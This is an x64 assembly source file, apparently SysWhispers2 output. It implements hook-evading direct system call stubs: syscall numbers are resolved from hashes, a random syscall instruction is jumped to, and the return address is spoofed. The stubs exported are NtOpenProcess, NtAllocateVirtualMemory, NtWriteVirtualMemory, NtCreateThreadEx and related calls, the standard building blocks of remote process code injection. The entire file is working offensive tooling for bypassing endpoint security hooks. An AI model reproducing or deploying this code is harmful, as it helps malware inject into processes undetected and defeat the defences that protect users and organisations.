.data
currentHash     dd  0
returnAddress   dq  0
syscallNumber   dd  0
syscallAddress  dq  0

.code
EXTERN SW2_GetSyscallNumber: PROC
EXTERN SW2_GetRandomSyscallAddress: PROC
    
WhisperMain PROC
    pop rax
    mov [rsp+ 8], rcx                       ; Save registers.
    mov [rsp+16], rdx
    mov [rsp+24], r8
    mov [rsp+32], r9
    sub rsp, 28h
    mov ecx, currentHash
    call SW2_GetSyscallNumber
    mov dword ptr [syscallNumber], eax      ; Save the syscall number
    xor rcx, rcx
    call SW2_GetRandomSyscallAddress        ; Get a random syscall address
    mov qword ptr [syscallAddress], rax     ; Save the random syscall address
    xor rax, rax
    mov eax, syscallNumber
    add rsp, 28h
    mov rcx, [rsp+ 8]                       ; Restore registers.
    mov rdx, [rsp+16]
    mov r8, [rsp+24]
    mov r9, [rsp+32]
    mov r10, rcx
    pop qword ptr [returnAddress]           ; Save the original return address
    call qword ptr [syscallAddress]         ; Call the random syscall instruction
    push qword ptr [returnAddress]          ; Restore the original return address
    ret
WhisperMain ENDP

NtOpenProcess PROC
    mov currentHash, 0633B2AE6h    ; Load function hash into global variable.
    call WhisperMain               ; Resolve function hash into syscall number and make the call
NtOpenProcess ENDP

NtAllocateVirtualMemory PROC
    mov currentHash, 00B901715h    ; Load function hash into global variable.
    call WhisperMain               ; Resolve function hash into syscall number and make the call
NtAllocateVirtualMemory ENDP

NtWriteVirtualMemory PROC
    mov currentHash, 0F75FEFCFh    ; Load function hash into global variable.
    call WhisperMain               ; Resolve function hash into syscall number and make the call
NtWriteVirtualMemory ENDP

NtCreateThreadEx PROC
    mov currentHash, 074AF4416h    ; Load function hash into global variable.
    call WhisperMain               ; Resolve function hash into syscall number and make the call
NtCreateThreadEx ENDP

NtWaitForSingleObject PROC
    mov currentHash, 026BA3C17h    ; Load function hash into global variable.
    call WhisperMain               ; Resolve function hash into syscall number and make the call
NtWaitForSingleObject ENDP

NtClose PROC
    mov currentHash, 034ECACD1h    ; Load function hash into global variable.
    call WhisperMain               ; Resolve function hash into syscall number and make the call
NtClose ENDP

NtFreeVirtualMemory PROC
    mov currentHash, 087957DD7h    ; Load function hash into global variable.
    call WhisperMain               ; Resolve function hash into syscall number and make the call
NtFreeVirtualMemory ENDP

end